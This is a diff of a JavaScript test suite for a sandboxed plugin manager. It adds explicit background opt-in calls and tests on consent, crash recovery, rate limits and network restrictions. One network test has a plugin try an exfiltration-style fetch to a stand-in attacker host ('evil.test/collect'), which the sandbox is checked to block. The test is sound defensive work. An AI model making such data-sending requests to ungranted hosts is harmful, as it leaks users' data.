@@ -119,6 +119,7 @@ test('plugins start disabled and enabling records exactly the requested grant', 
 test('an update that widens access pauses the plugin until it is approved again', () => {
   const env = setup();
   env.manager.setEnabled('pulse', true);
+  env.manager.setBackground('pulse', true);
   writePlugin(env.userDir, { ...CODE, version: '1.1.0', permissions: [...CODE.permissions, 'sys.cpu'], network: { hosts: ['api.example.com', 'collector.example.net'] } }, 'tm.onTick(() => {});');
   env.manager.reload();
   const plugin = env.plugin('pulse');
@@ -149,6 +150,7 @@ test('views sample only while shown; hiding the surface stops the source', async
 test('background alerts keep their own slow cadence with no surface and notify once', async () => {
   const env = setup();
   env.manager.setEnabled('sys-view', true);
+  env.manager.setBackground('sys-view', true);
   assert.deepEqual(env.bus.demandFor('alert:sys-view:hot'), { sources: ['sys.cpu'], lifecycle: 'background', intervalMs: 15_000 });
   await env.clock.advance(60_000);
   assert.ok(env.samples() >= 4 && env.samples() <= 5, `background cadence, got ${env.samples()}`);
@@ -166,7 +168,8 @@ test('background alerts keep their own slow cadence with no surface and notify o
 test('a code plugin runs only on demand, ticks by lifecycle and is released when idle', async () => {
   const env = setup();
   env.manager.setEnabled('pulse', true);
-  // Background is declared, so it runs slowly even with nothing on screen.
+  env.manager.setBackground('pulse', true);
+  // Explicitly enabled background work runs slowly with nothing on screen.
   assert.equal(env.running.has('pulse'), true);
   env.manager.handleMessage('pulse', { type: 'ready' });
   const ticks = () => env.sent.filter(([, message]) => message.type === 'tick');
@@ -191,6 +194,7 @@ test('a code plugin runs only on demand, ticks by lifecycle and is released when
 test('crashes restart with backoff and open the circuit after repeated failures', async () => {
   const env = setup();
   env.manager.setEnabled('pulse', true);
+  env.manager.setBackground('pulse', true);
   const starts = () => env.events.filter(([kind]) => kind === 'start').length;
   assert.equal(starts(), 1);
   env.manager.handleMessage('pulse', { type: 'ready' });
@@ -209,6 +213,7 @@ test('crashes restart with backoff and open the circuit after repeated failures'
   assert.equal(env.plugin('pulse').status, 'crashed');
   assert.equal(env.running.has('pulse'), false);
   env.manager.setEnabled('pulse', true);
+  env.manager.setBackground('pulse', true);
   assert.equal(env.plugin('pulse').status, 'active', 're-enabling closes the circuit');
   assert.equal(env.running.has('pulse'), true);
 });
@@ -216,6 +221,7 @@ test('crashes restart with backoff and open the circuit after repeated failures'
 test('messages are validated by sender: undeclared metrics, unpermitted reads and floods', () => {
   const env = setup();
   env.manager.setEnabled('pulse', true);
+  env.manager.setBackground('pulse', true);
   env.manager.handleMessage('pulse', { type: 'ready' });
   env.manager.handleMessage('pulse', { type: 'publish', metric: 'tpm', value: 1200 });
   assert.equal(env.bus.read('plugin.pulse.tpm').value, 1200);
@@ -242,6 +248,7 @@ test('messages are validated by sender: undeclared metrics, unpermitted reads an
 test('network requests reach only granted hosts over https', async () => {
   const env = setup();
   env.manager.setEnabled('pulse', true);
+  env.manager.setBackground('pulse', true);
   env.manager.handleMessage('pulse', { type: 'ready' });
   const results = () => env.sent.filter(([, message]) => message.type === 'result').map(([, message]) => message);
   env.manager.handleMessage('pulse', { type: 'call', id: 1, op: 'net.fetch', args: { url: 'https://evil.test/collect?d=1' } });
@@ -262,6 +269,7 @@ test('network requests reach only granted hosts over https', async () => {
 test('storage persists per plugin within its quota; notify needs the permission', async () => {
   const env = setup();
   env.manager.setEnabled('pulse', true);
+  env.manager.setBackground('pulse', true);
   env.manager.handleMessage('pulse', { type: 'ready' });
   env.manager.handleMessage('pulse', { type: 'call', id: 1, op: 'storage.set', args: { key: 'threshold', value: { tpm: 5 } } });
   env.manager.handleMessage('pulse', { type: 'call', id: 2, op: 'storage.get', args: { key: 'threshold' } });
@@ -310,6 +318,7 @@ test('invalid and duplicate plugins are listed with their problems instead of lo
 test('master disable revokes code immediately and blocks late broker calls', async () => {
   const env = setup();
   env.manager.setEnabled('pulse', true);
+  env.manager.setBackground('pulse', true);
   env.manager.handleMessage('pulse', { type: 'ready' });
   env.manager.handleMessage('pulse', { type: 'subscribe', source: 'tm.today' });
   env.setSettings({ pluginsEnabled: false });
@@ -326,6 +335,7 @@ test('master disable revokes code immediately and blocks late broker calls', asy
 test('idle grace retains only the process, without data delivery or broker activity', async () => {
   const env = setup();
   env.manager.setEnabled('pulse', true);
+  env.manager.setBackground('pulse', true);
   env.manager.handleMessage('pulse', { type: 'ready' });
   env.manager.handleMessage('pulse', { type: 'subscribe', source: 'tm.today' });
   env.manager.setBackground('pulse', false);
@@ -344,6 +354,7 @@ test('idle grace retains only the process, without data delivery or broker activ
 test('reload persists pending storage before replacing its owner', async () => {
   const env = setup();
   env.manager.setEnabled('pulse', true);
+  env.manager.setBackground('pulse', true);
   env.manager.handleMessage('pulse', { type: 'ready' });
   env.manager.handleMessage('pulse', { type: 'call', id: 1, op: 'storage.set', args: { key: 'threshold', value: 123 } });
   env.manager.reload();
@@ -357,6 +368,7 @@ test('reload persists pending storage before replacing its owner', async () => {
 test('a reduced manifest cannot use permissions or hosts from an older grant', async () => {
   const env = setup();
   env.manager.setEnabled('pulse', true);
+  env.manager.setBackground('pulse', true);
   writePlugin(env.userDir, { ...CODE, permissions: [], network: { hosts: [] } }, 'tm.onTick(() => {});');
   env.manager.reload();
   env.manager.handleMessage('pulse', { type: 'ready' });
@@ -373,6 +385,7 @@ test('restart aborts outstanding requests and never replies into the replacement
     return new Promise(resolve => { finish = resolve; });
   } });
   env.manager.setEnabled('pulse', true);
+  env.manager.setBackground('pulse', true);
   env.manager.handleMessage('pulse', { type: 'ready' });
   env.manager.handleMessage('pulse', { type: 'call', id: 1, op: 'net.fetch', args: { url: 'https://api.example.com/v1' } });
   env.manager.restart('pulse');
@@ -388,6 +401,7 @@ test('restart aborts outstanding requests and never replies into the replacement
 test('malformed structured-clone messages cannot escape into main or publish binary', () => {
   const env = setup();
   env.manager.setEnabled('pulse', true);
+  env.manager.setBackground('pulse', true);
   for (const message of [
     { type: 'subscribe', source: { toString: 0 } },
     { type: 'publish', metric: { toString: 0 }, value: 1 },
@@ -404,6 +418,7 @@ test('malformed structured-clone messages cannot escape into main or publish bin
 test('reload refuses to discard a dirty store when flushing fails, then recovers', () => {
   const env = setup();
   env.manager.setEnabled('pulse', true);
+  env.manager.setBackground('pulse', true);
   env.manager.handleMessage('pulse', { type: 'call', id: 1, op: 'storage.set', args: { key: 'threshold', value: 123 } });
   const data = path.join(env.root, 'data');
   fs.writeFileSync(data, 'blocks the directory');
@@ -422,6 +437,7 @@ test('metric alerts start their code producer without a separately declared back
     alerts: [{ id: 'high', title: 'High', message: 'High', source: { $: '@tpm' }, op: '>', value: 90 }] };
   const env = setup({ plugins: [manifest] });
   env.manager.setEnabled('pulse', true);
+  env.manager.setBackground('pulse', true);
   assert.equal(env.running.has('pulse'), true);
   env.manager.handleMessage('pulse', { type: 'ready' });
   env.manager.handleMessage('pulse', { type: 'publish', metric: 'tpm', value: 100 });
@@ -437,6 +453,7 @@ test('expanded display-list references are stopped by a whole-view budget', () =
     layout: { type: 'stack', children: Array.from({ length: 199 }, () => ({ type: 'draw', width: 400, height: 100, list: { $: '@chart' } })) } }] };
   const env = setup({ plugins: [manifest] });
   env.manager.setEnabled('pulse', true);
+  env.manager.setBackground('pulse', true);
   env.manager.handleMessage('pulse', { type: 'ready' });
   env.manager.handleMessage('pulse', { type: 'publish', metric: 'chart', value: Array.from({ length: 400 }, () => ({ op: 'rect', x: 0, y: 0, w: 1, h: 1 })) });
   env.manager.setSurfaceDemand('home', ['pulse/pulse']);
@@ -450,6 +467,7 @@ test('discovery rechecks host compatibility before starting an enabled producer'
   const env = setup({ plugins: [{ ...CODE, engines: { tokenMonitor: original } }] });
   t.after(() => { host.version = original; env.manager.dispose(); env.bus.dispose(); fs.rmSync(env.root, { recursive: true, force: true }); });
   env.manager.setEnabled('pulse', true);
+  env.manager.setBackground('pulse', true);
   assert.equal(env.plugin('pulse').status, 'active');
   host.version = '999.0.0'; env.manager.reload();
   assert.equal(env.plugin('pulse').status, 'invalid');
@@ -460,7 +478,8 @@ test('discovery rechecks host compatibility before starting an enabled producer'
 test('interactions are bound to an active declared control and a current runtime revision', t => {
   const interactive = { ...CODE, views: [{ id: 'editor', title: 'Editor', surfaces: ['home', 'page'], layout: { type: 'button', action: 'clear', label: 'Clear' } }] };
   const env = setup({ plugins: [interactive] }); t.after(() => { env.manager.dispose(); env.bus.dispose(); fs.rmSync(env.root, { recursive: true, force: true }); });
-  env.manager.setEnabled('pulse', true); env.manager.handleMessage('pulse', { type: 'ready' });
+  env.manager.setEnabled('pulse', true);
+  env.manager.setBackground('pulse', true); env.manager.handleMessage('pulse', { type: 'ready' });
   env.manager.setSurfaceDemand('page', ['pulse/editor']);
   const revision = () => env.manager.payload('page').views['pulse/editor'].revision;
   const event = { action: 'clear', type: 'press' }, oldRevision = revision();
@@ -497,4 +516,80 @@ test('idle teardown clears pending actions before a new Worker generation', asyn
   f.manager.setSurfaceDemand('page', ['actions/page']); f.manager.handleMessage('actions', { type: 'ready' });
   f.manager.handleMessage('actions', { type: 'heartbeat' }); await f.clock.advance(5000);
   assert.equal(f.events.some(event => event[0] === 'kill' && event[2] === 'interaction-timeout'), false);
+});
+
+for (const message of [{ type: 'tick-done', seq: 1 }, { type: 'call', id: 99, op: 'storage.get', args: { key: 'x' } }]) {
+  test(`main recovers from a rate-limited ${message.type} without waiting for a flood`, async () => {
+    const env = setup();
+    try {
+      env.manager.setEnabled('pulse', true);
+  env.manager.setBackground('pulse', true);
+      env.manager.handleMessage('pulse', { type: 'ready' });
+      for (let i = 0; i < 199; i++) env.manager.handleMessage('pulse', { type: 'log', text: 'burst' });
+      env.manager.handleMessage('pulse', message);
+      assert.equal(env.plugin('pulse').runtime.state, 'backoff');
+      assert.ok(env.events.some(e => e[0] === 'kill' && e[2] === 'protocol-rate-limit'));
+      await env.clock.advance(1001);
+      env.manager.handleMessage('pulse', { type: 'ready' });
+      assert.equal(env.plugin('pulse').runtime.state, 'running');
+      const tick = env.sent.filter(([, m]) => m.type === 'tick').at(-1)[1];
+      env.manager.handleMessage('pulse', { type: 'tick-done', seq: tick.seq });
+      env.manager.setSurfaceDemand('notch', ['pulse/pulse']);
+      assert.ok(env.sent.filter(([, m]) => m.type === 'tick').length >= 3);
+    } finally { env.manager.dispose(); fs.rmSync(env.root, { recursive: true, force: true }); }
+  });
+}
+
+test('a healthy heartbeat cannot hide a stuck tick and stale completions cannot release it', async () => {
+  const env = setup();
+  try {
+    env.manager.setEnabled('pulse', true);
+  env.manager.setBackground('pulse', true);
+    env.manager.handleMessage('pulse', { type: 'ready' });
+    env.manager.setSurfaceDemand('notch', ['pulse/pulse']);
+    for (let i = 0; i < 30; i++) {
+      env.manager.handleMessage('pulse', { type: 'heartbeat' });
+      env.manager.handleMessage('pulse', { type: 'tick-done', seq: 999 });
+      await env.clock.advance(1000);
+    }
+    assert.equal(env.sent.filter(([, m]) => m.type === 'tick').length, 1, 'wrong sequence cannot stack ticks');
+    assert.ok(env.events.some(e => e[0] === 'kill' && e[2] === 'tick-timeout'));
+    await env.clock.advance(1001);
+    env.manager.handleMessage('pulse', { type: 'ready' });
+    assert.equal(env.sent.filter(([, m]) => m.type === 'tick').length, 2, 'bounded restart resumes ticks');
+  } finally { env.manager.dispose(); fs.rmSync(env.root, { recursive: true, force: true }); }
+});
+
+test('background is opt-in; shared samples stop after hide, disable and removal', async () => {
+  const other = { ...SYSTEM, id: 'other-sys', alerts: [] };
+  const env = setup({ plugins: [SYSTEM, other, CODE] });
+  try {
+    for (const id of ['sys-view', 'other-sys', 'pulse']) env.manager.setEnabled(id, true);
+    await env.clock.advance(60000);
+    assert.equal(env.samples(), 0);
+    assert.equal(env.running.size, 0, 'declared background does not start without consent');
+    env.manager.setSurfaceDemand('home', ['sys-view/cpu', 'other-sys/cpu']);
+    await env.clock.advance(10000);
+    assert.equal(env.samples(), 6, 'two plugins share one immediate sample and five ticks');
+    env.manager.setEnabled('sys-view', false);
+    await env.clock.advance(2000);
+    assert.equal(env.samples(), 7, 'remaining consumer retains the single sampler');
+    env.manager.setSurfaceDemand('home', []);
+    await env.clock.advance(60000);
+    assert.equal(env.samples(), 7);
+    env.manager.setSurfaceDemand('home', ['other-sys/cpu']);
+    await env.clock.advance(2000);
+    fs.rmSync(path.join(env.userDir, 'other-sys'), { recursive: true });
+    env.manager.reload();
+    const afterRemoval = env.samples();
+    await env.clock.advance(60000);
+    assert.equal(env.samples(), afterRemoval, 'removed producer has no retained demand');
+    env.manager.setEnabled('sys-view', true);
+    env.manager.setBackground('sys-view', true);
+    await env.clock.advance(15000);
+    assert.ok(env.samples() > afterRemoval);
+    env.manager.setBackground('sys-view', false);
+    const afterOptOut = env.samples(); await env.clock.advance(60000);
+    assert.equal(env.samples(), afterOptOut);
+  } finally { env.manager.dispose(); env.bus.dispose(); fs.rmSync(env.root, { recursive: true, force: true }); }
 });
